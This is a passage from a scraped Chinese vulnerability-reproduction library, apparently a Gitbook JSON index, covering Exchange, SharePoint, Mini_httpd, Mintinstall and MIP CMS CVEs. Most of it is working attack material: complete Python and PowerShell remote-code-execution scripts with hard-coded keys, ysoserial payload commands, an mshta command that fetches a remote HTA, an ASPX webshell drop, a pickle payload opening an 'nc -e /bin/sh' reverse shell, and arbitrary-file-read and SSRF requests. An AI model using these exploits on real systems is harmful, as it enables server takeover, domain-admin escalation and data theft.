TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"2fdc8b0d-dcfb-4d0a-b464-95b9a2dcc968\" --isdebug –-islegacy MicrosoftExchange远程命令执行漏洞/media/rId26.png) 构造以下URL，使用生成的payload替换，使用上面所说的value值替换，最后用GET请求发送给服务器即可。 http://www.0-sec.org/ecp/default.aspx?__VIEWSTATEGENERATOR=&__VIEWSTATE= MicrosoftExchange远程命令执行漏洞/media/rId27.png) 收到dns请求 MicrosoftExchange远程命令执行漏洞/media/rId28.png) 由于Exchange Server的机器用户具备SYSTEM权限，默认在域内拥有WriteAcl的权限，因此，可以通过修改ACL的DS-Replication-Get-Changes和DS-Replication-Get-Changes-All来赋予任何一个用户Dcsync的权限，所以这个漏洞的最大危害在于：在域内拥有一个普通用户权限的情况下，通过Exchange Server上以system用户的身份执行任意的命令，再利用Exchange Server的WriteAcl权限，从而达到域管权限。 附录 经过简单测试，已知可利用路径： /ecp/default.aspx __VIEWSTATEGENERATOR=B97B4E27 /ecp/PersonalSettings/HomePage.aspx?showhelp=false& __VIEWSTATEGENERATOR=1D01FD4E /ecp/PersonalSettings/HomePage.aspx?showhelp=false& __VIEWSTATEGENERATOR=1D01FD4E /ecp/Organize/AutomaticReplies.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/RulesEditor/InboxRules.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/Organize/DeliveryReports.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/MyGroups/PersonalGroups.aspx?showhelp=false& __VIEWSTATEGENERATOR=A767F62B /ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&id=38f4bec5-704f-4272-a654-95d53150e2ae&ReturnObjectType=1 __VIEWSTATEGENERATOR=321473B8 /ecp/Customize/Messaging.aspx?showhelp=false& __VIEWSTATEGENERATOR=9C5731F0 /ecp/Customize/General.aspx?showhelp=false& __VIEWSTATEGENERATOR=72B13321 /ecp/Customize/Calendar.aspx?showhelp=false& __VIEWSTATEGENERATOR=4AD51055 /ecp/Customize/SentItems.aspx?showhelp=false& __VIEWSTATEGENERATOR=4466B13F /ecp/PersonalSettings/Password.aspx?showhelp=false& __VIEWSTATEGENERATOR=59543DCA /ecp/SMS/TextMessaging.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/TroubleShooting/MobileDevices.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/Customize/Regional.aspx?showhelp=false& __VIEWSTATEGENERATOR=9097CD08 /ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&ReturnObjectType=1 __VIEWSTATEGENERATOR=FD338EE0 /ecp/Security/BlockOrAllow.aspx?showhelp=false& __VIEWSTATEGENERATOR=362253EF 全自动（支持加密） CVE-2020-0688_EXP Auto trigger payload python3 CVE-2020-0688_EXP.py -h usage: CVE-2020-0688_EXP.py [-h] -s SERVER -u USER -p PASSWORD -c CMD [-e] optional arguments: -h, --help show this help message and exit -s SERVER, --server ECP Server URL Example: http://ip/owa -u USER, --user USER login account Example: domain\\user -p PASSWORD, --password PASSWORD -c CMD, --cmd CMD Command u want to execute -e, --encrypt Encrypt the payload example: python CVE-2020-0688_EXP.py -s https://mail.x.com/ -u user@x.com -p passwd -c \"mshta http://1.1.1.1/test.hta\" 需要把ysoserial.exe 放当前目录 https://github.com/ianxtianxt/ysoserial.net/ # encoding: UTF-8 import requests import readline import argparse import re import sys import os import urllib3 from urllib.parse import urlparse from urllib.parse import quote urllib3.disable_warnings() ysoserial_path = os.path.abspath(os.path.dirname(__file__))+\"/ysoserial-1.32/\" session = requests.Session() def get_value(url, user, pwd): print(\"[*] Tring to login owa...\") tmp = urlparse(url) base_url = \"{}://{}\".format(tmp.scheme, tmp.netloc) paramsPost = {\"password\": \"\"+pwd+\"\", \"isUtf8\": \"1\", \"passwordText\": \"\", \"trusted\": \"4\", \"destination\": \"\"+url+\"\", \"flags\": \"4\", \"forcedownlevel\": \"0\", \"username\": \"\"+user+\"\"} headers = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0\", \"Connection\": \"close\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"PrivateComputer=true; PBack=0\"} cookies = {\"PBack\": \"0\", \"PrivateComputer\": \"true\"} login_url = base_url + '/owa/auth.owa' print(\"[+] Login url: {}\".format(login_url)) try: login = session.post(login_url, data=paramsPost, headers=headers, verify=False, timeout=30) print(\"[*] Status code: %i\" % login.status_code) if \"reason=\" in login.text or \"reason=\" in login.url and \"owaLoading\" in login.text: print(\"[!] Login Incorrect, please try again with a different account..\") # sys.exit(1) #print(str(response.text)) except Exception as e: print(\"[!] login error , error: {}\".format(e)) sys.exit(1) print(\"[+] Login successfully! \") try: print(\"[*] Tring to get __VIEWSTATEGENERATOR...\") target_url = \"{}/ecp/default.aspx\".format(base_url) new_response = session.get(target_url, verify=False, timeout=15) view = re.compile( 'id=\"__VIEWSTATEGENERATOR\" value=\"(.+?)\"').findall(str(new_response.text))[0] print(\"[+] Done! __VIEWSTATEGENERATOR:{}\".format(view)) except: view = \"B97B4E27\" print(\"[*] Can't get __VIEWSTATEGENERATOR, use default value: {}\".format(view)) try: print(\"[*] Tring to get ASP.NET_SessionId....\") key = session.cookies['ASP.NET_SessionId'] print(\"[+] Done! ASP.NET_SessionId: {}\".format(key)) except Exception as e: key = None print(\"[!] Get ASP.NET_SessionId error, error: {} \\n[*] Exit..\".format(e)) return view, key, base_url def ysoserial(cmd): cmd = ysoserial_path+cmd r = os.popen(cmd) res = r.readlines() return res[-1] def main(): parser = argparse.ArgumentParser() parser.add_argument(\"-s\", \"--server\", required=True, help=\"ECP Server URL Example: http://ip/owa\") parser.add_argument(\"-u\", \"--user\", required=True, help=\"login account Example: domain\\\\user\") parser.add_argument(\"-p\", \"--password\", required=True, help=\"Password\") parser.add_argument(\"-c\", \"--cmd\", help=\"Command u want to execute\", required=True) parser.add_argument(\"-e\", \"--encrypt\", help=\"Encrypt the payload\", action='store_true',default=False) args = parser.parse_args() url = args.server print(\"[*] Start to exploit..\") user = args.user pwd = args.password command = args.cmd view, key, base_url = get_value(url, user, pwd) if key is None: key = 'test' sys.exit(1) ex_payload = \"\"\"ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"{}\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"{}\" --viewstateuserkey=\"{}\" --islegacy \"\"\".format(command,view,key) if args.encrypt: re_payload = ex_payload + ' --decryptionalg=\"3DES\" --decryptionkey=\"E9D2490BD0075B51D1BA5288514514AF\" --isencrypted' else: re_payload = ex_payload + \" --isdebug\" print(\"\\n\"+re_payload) out_payload = ysoserial(re_payload) if args.encrypt: final_exp = \"{}/ecp/default.aspx?__VIEWSTATEENCRYPTED=&__VIEWSTATE={}\".format(base_url, quote(out_payload)) else: final_exp = \"{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}\".format(base_url, view, quote(out_payload)) print(\"\\n[+] Exp url: {}\".format(final_exp)) print(\"\\n[*] Auto trigger payload..\") status = session.get(final_exp,verify=False,timeout=15) if status.status_code==500: print(\"[*] Status code: %i, Maybe success!\" % status.status_code) if __name__ == \"__main__\": main() 参考链接 https://www.anquanke.com/post/id/199772 https://www.t00ls.net/thread-55149-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:40 "},"Web安全/Microsoft Exchange/（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞/（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞.html":{"url":"Web安全/Microsoft Exchange/（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞/（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞.html","title":"（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞","keywords":"","body":"（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞 一、漏洞简介 有安全人员公开了Exchange Server远程代码执行漏洞（CVE-2020-16875）的利用程序，此漏洞为微软在9月8日例行月度安全更新中披露；Microsoft Exchange在Internet Explorer处理内存中的对象时存在该漏洞。利用此漏洞需要具有以某个Exchange角色进行身份验证的用户权限。 攻击者可通过向受影响的Exchange服务器发送包含特殊的cmdlet参数的邮件来触发此漏洞，成功利用此漏洞的攻击者可在受影响的系统上以system权限执行任意代码。 利用条件 需要一个Exchange用户账号 二、漏洞影响 Microsoft:Exchange_server_2016: cu16/cu17 Microsoft:Exchange_server_2019: cu5/cu6 三、复现过程 需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。 poc CVE-2020-16875.py MicrosoftExchange远程命令执行漏洞/media/rId26.png) #!/usr/bin/env python3 \"\"\" Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875 # Notes: The (ab)user needs the \"Data Loss Prevention\" role assigned and if performing the attack over the ecp interface (this poc) then the user will need an active mailbox. [PS] C:\\Windows\\system32>New-RoleGroup -Name \"dlp users\" -Roles \"Data Loss Prevention\" -Members \"harrym\" Name AssignedRoles RoleAssignments ManagedBy ---- ------------- --------------- --------- dlp users {Data Loss Prevention} {Data Loss Prevention-dlp users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test} [PS] C:\\Windows\\system32>Get-RoleGroup \"dlp users\" | Format-List RunspaceId : 098e1140-30e3-4144-8028-2174fdb43b85 ManagedBy : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test} RoleAssignments : {Data Loss Prevention-dlp users} Roles : {Data Loss Prevention} DisplayName : ExternalDirectoryObjectId : Members : {exchangedemo.com/Users/Harry Mull} SamAccountName : dlp users Description : RoleGroupType : Standard LinkedGroup : Capabilities : {} LinkedPartnerGroupId : LinkedPartnerOrganizationId : Identity : exchangedemo.com/Microsoft Exchange Security Groups/dlp users IsValid : True ExchangeVersion : 0.10 (14.0.100.0) Name : dlp users DistinguishedName : CN=dlp users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com Guid : fa5c8458-8255-4ffd-b128-2a66bf9dbfd6 ObjectCategory : exchangedemo.com/Configuration/Schema/Group ObjectClass : {top, group} WhenChanged : 6/12/2020 11:29:31 PM WhenCreated : 6/12/2020 11:29:31 PM WhenChangedUTC : 6/12/2020 3:29:31 PM WhenCreatedUTC : 6/12/2020 3:29:31 PM OrganizationId : Id : exchangedemo.com/Microsoft Exchange Security Groups/dlp users OriginatingServer : DEAD01.exchangedemo.com ObjectState : Changed # Example: researcher@incite:~$ ./poc.py (+) usage: ./poc.py (+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint researcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint (+) logged in as harrym@exchangedemo.com (+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5 (+) executed mspaint as SYSTEM! \"\"\" import re import sys import random import string import urllib3 import requests urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def random_string(str_len=8): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(str_len)) def get_xml(c): return \"\"\" 4 si \"\"\" % c def trigger_rce(t, s, vs, cmd): f = { '__VIEWSTATE': (None, vs), 'ctl00$ResultPanePlaceHolder$senderBtn': (None, \"ResultPanePlaceHolder_ButtonsPanel_btnNext\"), 'ctl00$ResultPanePlaceHolder$contentContainer$name': (None, random_string()), 'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl': (\"dlprce.xml\", get_xml(cmd)), } r = s.post(\"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx\" % t, files=f, verify=False) assert r.status_code == 200, \"(-) failed to trigger rce!\" def leak_viewstate(t, s): r = s.get(\"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx\" % t, verify=False) match = re.search(\"\", r.text) assert match != None, \"(-) couldn't leak the __viewstate!\" return match.group(1) def log_in(t, usr, pwd): s = requests.Session() d = { \"destination\": \"https://%s/owa\" % t, \"flags\": \"\", \"username\": usr, \"password\": pwd } s.post(\"https://%s/owa/auth.owa\" % t, data=d, verify=False) assert s.cookies.get(name='X-OWA-CANARY') != None, \"(-) couldn't leak the csrf canary!\" return s def main(t, usr, pwd, cmd): s = log_in(t, usr, pwd) print(\"(+) logged in as %s\" % usr) vs = leak_viewstate(t, s) print(\"(+) found the __viewstate: %s\" % vs) trigger_rce(t, s, vs, cmd) print(\"(+) executed %s as SYSTEM!\" % cmd) if __name__ == '__main__': if len(sys.argv) != 4: print(\"(+) usage: %s \" % sys.argv[0]) print(\"(+) eg: %s 192.168.75.142 [email protected]/* */:user123### mspaint\" % sys.argv[0]) sys.exit(-1) trgt = sys.argv[1] assert \":\" in sys.argv[2], \"(-) you need a user and password!\" usr = sys.argv[2].split(\":\")[0] pwd = sys.argv[2].split(\":\")[1] cmd = sys.argv[3] main(trgt, usr, pwd, cmd) powershell版本： # Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability # Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875 # # Notes: # # The (ab)user needs the \"Data Loss Prevention\" role assigned # [PS] C:\\Windows\\system32>New-RoleGroup -Name \"dlp users\" -Roles \"Data Loss Prevention\" -Members \"harrym\" # # Name AssignedRoles RoleAssignments ManagedBy # ---- ------------- --------------- --------- # dlp users {Data Loss Prevention} {Data Loss Prevention-dlp users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test} # # # [PS] C:\\Windows\\system32>Get-RoleGroup \"dlp users\" | Format-List # # RunspaceId : 098e1140-30e3-4144-8028-2174fdb43b85 # ManagedBy : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/test} # RoleAssignments : {Data Loss Prevention-dlp users} # Roles : {Data Loss Prevention} # DisplayName : # ExternalDirectoryObjectId : # Members : {exchangedemo.com/Users/Harry Mull} # SamAccountName : dlp users # Description : # RoleGroupType : Standard # LinkedGroup : # Capabilities : {} # LinkedPartnerGroupId : # LinkedPartnerOrganizationId : # Identity : exchangedemo.com/Microsoft Exchange Security Groups/dlp users # IsValid : True # ExchangeVersion : 0.10 (14.0.100.0) # Name : dlp users # DistinguishedName : CN=dlp users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com # Guid : fa5c8458-8255-4ffd-b128-2a66bf9dbfd6 # ObjectCategory : exchangedemo.com/Configuration/Schema/Group # ObjectClass : {top, group} # WhenChanged : 6/12/2020 11:29:31 PM # WhenCreated : 6/12/2020 11:29:31 PM # WhenChangedUTC : 6/12/2020 3:29:31 PM # WhenCreatedUTC : 6/12/2020 3:29:31 PM # OrganizationId : # Id : exchangedemo.com/Microsoft Exchange Security Groups/dlp users # OriginatingServer : DEAD01.exchangedemo.com # ObjectState : Changed # # Example: # # PS C:\\Users\\researcher> .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr [email protected]/* */ -pwd user123### -cmd mspaint # (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with [email protected]/* */:user123### # (+) executed mspaint as SYSTEM! # PS C:\\Users\\researcher> param ( [Parameter(Mandatory=$true)][string]$server, [Parameter(Mandatory=$true)][string]$usr, [Parameter(Mandatory=$true)][string]$pwd, [string]$cmd = \"mspaint\" ) Function Get-RandomAlphanumericString { [CmdletBinding()] Param ( [int] $length = 8 ) Process{ Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) ) } } function Exploit-Exchange { Param ( [string] $server, [string] $usr, [string] $pwd, [string] $cmd ) \"(+) targeting $server with ${usr}:$pwd\" $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd) $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds $xml = @\" 4 si \"@ $n = Get-RandomAlphanumericString [Byte[]]$d = [System.Text.Encoding]::UTF8.GetBytes($xml) Invoke-Command -Session $s -ScriptBlock { New-DlpPolicy -Name $Using:n -TemplateData $Using:d } | Out-Null \"(+) executed $cmd as SYSTEM!\" } Get-PSSession | Remove-PSSession Exploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:41 "},"Web安全/Microsoft SharePoint/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞.html":{"url":"Web安全/Microsoft SharePoint/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞.html","title":"（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞","keywords":"","body":"（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞 一、漏洞简介 Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。 Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。 二、漏洞影响 Microsoft SharePoint Enterprise Server 2016SharePoint Foundation 2013 SP1harePoint Server 2010 SP2SharePoint Server 2019 三、复现过程 ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。 该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种： · Microsoft.SharePoint.WebControls.ItemPickerDialog in Microsoft.SharePoint.dll · Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog in Microsoft.SharePoint.Portal.dll 利用第一种 PickerDialogType 类型 当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 \"__\" 为开头时(类似于\"_dummy\")， EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。 这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。 完整POST以及具体参数如下： URL：/Picker.aspx?PickerDialogType=控件的程序集限定名 参数： ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=payload 实际上还需访问Picker.aspx附带的其它参数，测试我不附带其它参数时提交表单是失败的。 poc https://download.0-sec.org/Web安全/Microsoft SharePoint/CVE20190604-Payload.7z 解说k8gege的cve-2019-0604-exp.py 老实说k8gege的py脚本有点花哨，一大堆的16进制字符串，分成 payload1,2,3, 好坏呀 python脚本远程post的payload,反序列化之后是一个xml数据体 cmd /c echo ^^ > \"%CommonProgramFiles%\\\\Microsoft Shared\\\\Web Server Extensions\\\\15\\\\TEMPLATE\\\\LAYOUTS\\\\ua.aspx\" MicrosoftSharePoint远程代码执行漏洞/media/rId25.png) 即远程执行echo命令，向服务器SharePoint的模板layouts目录写了一个up.aspx文件 cmd /c echo ^^ > \"%CommonProgramFiles%\\\\Microsoft Shared\\\\Web Server Extensions\\\\15\\\\TEMPLATE\\\\LAYOUTS\\\\ua.aspx\" 生成了一个K8飞刀专用UA一句话木马.asxp，OK，shell到手 结合k8的poc构造我们自己的payload 1、 下载编译好的程序，解压运行CVE20190604Forms.exe 2、在Cmd文本框加输入命令，点击\"Update XML\"按钮，会将命令合并为xml 3、点击\"EncodeEntity\"，程序将xml字符串序列化为对象，并触发执行payload, 序列化后的字符串显示在\\\"payload\\\"文本框中 __cp087135009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e60046005600460075002700160...... 4、 \\\"__cp....\\\" 这些字符串就是payload了，复制到 cve-2019-0604-exp.py中，修改替换掉原来k8的payload， 5、向Picker.aspx提交payload时，需要附带的其它参数，可通过Burp代理工具，获取一下相关的参数，再将payload值传给 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData ... values = { '__REQUESTDIGEST':YOUR_REQUESTDIGEST, '__EVENTTARGET':'', '__EVENTARGUMENT':'', '__spPickerHasReturnValue':'', '__spPickerReturnValueHolder':'', '__VIEWSTATE':YOUR_VIEWSTATE, '__VIEWSTATEGENERATOR':'', 'ctl00$PlaceHolderDialogBodySection$ctl07$queryTextBox':'', 'ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData':**YOUR_PayloadData**, 'ctl00$PlaceHolderDialogBodySection$ctl05$OriginalEntities':'', 'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityKey':'', 'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityDisplayText':'', 'ctl00$PlaceHolderDialogBodySection$ctl05$downlevelTextBox':' ', '__CALLBACKID':'ctl00$PlaceHolderDialogBodySection$ctl07', '__CALLBACKPARAM':';#;#11;#;#;#', '__EVENTVALIDATION':YOUR_EVENTVALIDATION } data = urllib.urlencode(values) ... 6、运行py脚本, good luck!!! 参考链接 https://github.com/boxhg/CVE-2019-0604/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:42 "},"Web安全/Microsoft SharePoint/（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞/（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞.html":{"url":"Web安全/Microsoft SharePoint/（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞/（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞.html","title":"（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞","keywords":"","body":"（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞 一、漏洞简介 SharePoint Portal Server 是一套门户网站解决方案，使得企业能够便捷地开发出智能的门户网站，能够无缝连接到用户、团队和知识。因此用户能够更好地利用业务流程中的相关信息，更有效地开展工作。 当Microsoft SharePoint Server无法正确识别和过滤不安全的ASP.Net Web控件时，将会存在一处远程代码执行漏洞。成功利用此漏洞的远程攻击者(需要身份验证)通过创建特制的页面，可以在SharePoint应用进程池的上下文中执行任意代码。 二、漏洞影响 Microsoft SharePoint Enterprise Server 2016Microsoft SharePoint Foundation 2010 Service Pack 2Microsoft SharePoint Foundation 2013 Service Pack 1Microsoft SharePoint Server 2019 三、复现过程 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c cale.exe MicrosoftSharePoint远程代码执行漏洞/media/rId24.png) 替换掉poc.xml内的payload Poc.xml Deserialize 这里放payload 通过 curl -L -v --ntlm --negotiate \"https://www.0-sec.org/_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion\" --data \"viewstate=&__SUGGESTIONSCHACHE=urlencode(poc.xml)” MicrosoftSharePoint远程代码执行漏洞/media/rId25.png) 触发漏洞，执行命令 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:44 "},"Web安全/Mini_httpd/（CVE-2018-18778）Mini_httpd 任意文件读取漏洞/（CVE-2018-18778）Mini_httpd 任意文件读取漏洞.html":{"url":"Web安全/Mini_httpd/（CVE-2018-18778）Mini_httpd 任意文件读取漏洞/（CVE-2018-18778）Mini_httpd 任意文件读取漏洞.html","title":"（CVE-2018-18778）Mini_httpd 任意文件读取漏洞","keywords":"","body":"（CVE-2018-18778）Mini_httpd 任意文件读取漏洞 一、漏洞简介 Mini_httpd是一个微型的Http服务器，在占用系统资源较小的情况下可以保持一定程度的性能（约为Apache的90%），因此广泛被各类IOT（路由器，交换器，摄像头等）作为嵌入式服务器。而包括华为，zyxel，海康威视，树莓派等在内的厂商的旗下设备都曾采用Mini_httpd组件。 在mini_httpd开启虚拟主机模式的情况下，用户请求http://HOST/FILE将会访问到当前目录下的HOST/FILE文件。 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); 见上述代码，分析如下： 当HOST=example.com、FILE=index.html的时候，上述语句结果为example.com/index.html，文件正常读取。 当HOST为空、FILE=etc/passwd的时候，上述语句结果为/etc/passwd。 后者被作为绝对路径，于是读取到了/etc/passwd，造成任意文件读取漏洞。 二、漏洞影响 三、复现过程 发送请求是将Host置空，PATH的值是文件绝对路径： GET /etc/passwd HTTP/1.1 Host: www.0-sec.org Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close 成功读取文件： Mini_httpd任意文件读取漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/mini\\_httpd/CVE-2018-18778/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:45 "},"Web安全/Mintinstall/（CVE-2019-17080）Mintinstall object injection/（CVE-2019-17080）Mintinstall object injection.html":{"url":"Web安全/Mintinstall/（CVE-2019-17080）Mintinstall object injection/（CVE-2019-17080）Mintinstall object injection.html","title":"（CVE-2019-17080）Mintinstall object injection","keywords":"","body":"（CVE-2019-17080）Mintinstall object injection 一、漏洞简介 Linux mint软件管理器（v 7.9.5 / 9）由于配置错误而导致对象注入和任意代码执行。 Linux Mint Software Manager（v 7.9.5 / 9）由于配置错误而导致我们执行对象注入和任意代码 二、漏洞影响 Version: 7.9.9 三、复现过程 mintinsall 我们运行Mint软件管理器还会检查是否有新注释，如果new-reviews.list 下载中有 新注释并写入文件。 如果有新评论，请从文件new-reviews.list下载并写入文件 code mintinstall.py 首次启动软件管理器时，它会从评论模块调用ReviewCache（）类。 它如何处理数据？ code reviews.py 当ReviewCache类启动（init）时，它将调用_load_cache（）函数。 加载缓存功能读取REVIEWS_CACHE变量中的文件，并在pickle模块的帮助下，对文件中的数据进行反序列化并在内存中保存一些值 当我检查文件时，看起来好像可以写文件。 Pickle 因为我们可以使用模块执行序列化/反序列化操作，所以可以包含模块并使用reduce方法执行任意代码。 如果您尝试反序列化文件，则我们的恶意代码将起作用。 cos system (S'nc -e /bin/sh 192.168.2.138 4545' tR. >>modül adı c{os} >> fonksiyon ( >> işaretleyici nesnesi S >> tırnak sonuna kadar okuyup stack'e at tR. >> stackte olanları çagır ve sonucu stacke yerleştir. alt-text poc import os import sys def shellCode(payload): with open(f\"{os.getenv('HOME')}/.cache/mintinstall/reviews.cache\",\"w\") as wb: wb.write(payload) print(\"[+] Start mintinstall\") if __name__==\"__main__\": shellCode(f\"\"\"cos\\nsystem\\n(S\"nc -e /bin/sh {sys.argv[1]} {sys.argv[2]}\"\\ntR.\"\"\") else: print(\"[!] exploit.py [IP] [PORT]\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:46 "},"Web安全/MIP建站系统/MIP建站系统 v5.0.5 SSRF漏洞/MIP建站系统 v5.0.5 SSRF漏洞.html":{"url":"Web安全/MIP建站系统/MIP建站系统 v5.0.5 SSRF漏洞/MIP建站系统 v5.0.5 SSRF漏洞.html","title":"MIP建站系统 v5.0.5 SSRF漏洞","keywords":"","body":"MIP建站系统 v5.0.5 SSRF漏洞 一、漏洞简介 二、漏洞影响 MIP建站系统 v5.0.5 三、复现过程 漏洞分析 进行简单的漏洞分析。根据漏洞定位代码文件：app/setting/controller/ApiAdminDomainSettings.php受影响代码： public function urlPost(Request $request) { $postAddress = input('post.postAddress'); if (!$postAddress) { return jsonError('请先去设置推送的接口'); } $api = trim($postAddress); if (strpos($api,'type=realtime') !== false || strpos($api,'type=batch') !== false) { if (!config('siteInfo')['guanfanghaoStatus']) { return jsonError('检测到您未开启熊掌号，请开启后再推送'); } } $url = input('post.url'); $id = input('post.id'); if (!$url) { return jsonError('没有检测到你推送的页面地址'); } $urls[] = $url; $ch = curl_init(); $options = array( CURLOPT_URL => $api, CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_POSTFIELDS => implode(\"\\n\", $urls), CURLOPT_HTTPHEADER => array('Content-Type: text/plain'), ); curl_setopt_array($ch, $options); $result = curl_exec($ch); 流程分析： 1、$ postAddress = input('post.postAddress'); //POST方法将$postAddress参数传入 2、$api = trim($postAddress); $options = array( CURLOPT_URL => $api, CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_POSTFIELDS => implode(\"\\n\", $urls), CURLOPT_HTTPHEADER => array('Content-Type: text/plain'), ); curl_setopt_array($ch, $options); //赋予$api参数，一直至$ch，未进行任何过滤 3、$result = curl_exec($ch); //最后执行 漏洞复现 第一步，登陆该后台： 第二步，访问所受影响的代码文件： http://www.0-sec.org/index.php？s=/setting/ApiAdminDomainSettings/urlPost； POST方法进行请求，payload： postAddress=file:///C:\\phpStudy\\PHPTutorial\\WWW\\app\\database.php&url=test&id=test 参考链接 https://xz.aliyun.com/t/7431 Qingy文库 all right reserved，powered by 